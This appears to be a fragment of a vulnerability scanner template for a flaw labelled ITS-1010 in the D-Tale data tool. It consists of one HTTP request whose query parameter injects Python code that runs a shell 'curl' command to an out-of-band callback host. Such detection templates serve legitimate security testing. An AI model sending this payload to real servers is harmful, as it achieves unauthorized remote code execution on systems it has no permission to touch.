# Vulnerable: ITS-1010
GET /dtale/test-filter/{{data_id}}?query=%40pd.core.frame.com.builtins.__import__(%27os%27).system(%27curl+{{interactsh-url}}%27)&save=true
